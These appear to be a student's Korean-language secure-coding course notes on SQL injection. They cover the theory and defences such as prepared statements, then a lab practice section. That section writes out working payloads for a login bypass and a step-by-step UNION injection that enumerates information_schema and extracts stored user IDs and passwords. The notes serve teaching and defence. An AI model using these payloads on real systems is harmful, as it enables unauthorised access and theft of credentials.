# SecureCoding-Study
시큐어코딩 수업
실습, 이론
C:\SecureCoding
# 11주차
# SQL 삽입공격
### -이론-
동적 쿼리 SQL문 사용할때 
외부 입력값에 따라 쿼리문에 구조가 바뀌는 취약점을 이용
-피해유형
1. DB 정보 열람 및 추가 , 삭제 가능
2. 프로시저를 통해 운영체제 명령어 수행
3. 웹 애플리케이션을 조정해 다른 시스템을 공격
4. 불법 로그인
- 공격의 유형
1. Form Based SQL 삽입
 웹사이트페이지 Form에서 로그인할때 칸에
  sql문으로 사용할수 있는 특수문자 이용히여 공격
2. UNION SQL 삽임
 웹애플리케이션이 조회결과를 리스트로 출력하는 화면을 가진경우
- 방어
1. 정적쿼리를 사용 
PreparedStatement 을 사용 정적쿼리 방식으로 미리만들어진 쿼리문을
활용 외부입력값은 set메소드를 입력 -> 쿼리 구조가 변조 방지
2. 동적쿼리일때
특수문자 및 SQL 명령문으로 사용되는 키워드 철저히 제거

### -실습-
실습환경: 1. 웹 애플리케이션 서버는 사용자의 입력을 받아
            동적 쿼리에 사용하고 있음
         2. 화이트리스트 기반의 필터링을 전혀 사용하지 않음
         ---> sql삽입공격에 매우 취약함
         ID :test PW:test 
 
1. 비정상적인 입력 값으로 인증 우회가능성 확인
1) ID :'or'a-'='a  PW :  ID :'or'a-'='a
 --> HTTP Status 500 Error 발생
 too many results 구문이 있다 
 -> 정상적인 상황보다 많은정보를 요청하여 서버가표시할수없음
 항상참값이 봔환되어 모든테이블의 정보를 확인하라는 명령으로 변경되었다.
 
2) ID:admin'#  PW:aaa 
 --> 관리자 모드로 로그인
 
 2. UNION SQL 삽입공격 실습
  :UNION SQL 삽입 취약점을 이용하여 단계적으로 보안 자산의 정보추출
   공격자가 원하는 중요 정보 자산을 탈취하는 공격 과정
  시큐어코딩테스트-> SQL 인젝션 -> MYSQL 인젝션 -> ID:admin
 
 1) ID:admin'union select 1,2,3,4# --> DB에서 사용하는 컬럼의개수 확인 ->에러
 2) 순차적으로 컬럼을 높여감 ID:admin'union select 1,2,3,4,5# -> 에러
 3) ID:admin'union select 1,2,3,4,5,6# --> 정보가 나타남
   -> 따라서 DB컬럼개수:6개 -> 향후 공격에서 컬럼6개로 맞춰주고,1~4번 컬럼에
   악성 쿼리문을 삽입하면 정보 유출가능성이 있다.
 4) DBMS버전 확인 ID:admin'union select version(),2,3,4,5,6#
  -> Union select와 버전 키워드를 사용함으로써 해당 DBMS의 버전정보를 얻어올수있음
 5) 공격대상 DM목록 확인 
  -> ID:admin'union select schema_name,2,3,4,5,6 from     
     information_schema.schemata#
 6) 특정 DB선정후 ,테이블 목록확인
  -> ID:admin'union select group_concat(table_name),2,3,4,5,6 from
     information_schema.tables where table_shema=database()#
 7) 테이블의 컬럼 명 확인
   -> ID:admin'union select group_concat(column_name),2,3,4,5,6 from
     information_schema.columns where table_name='board_member'#
 8) 컬럼 데이터 추출
   -> ID:admin'union select idx,userid,userpw,username,5,6
      from board_member#
          
         
         
         
         
         
         
         
         
         
         
         
         
         
         
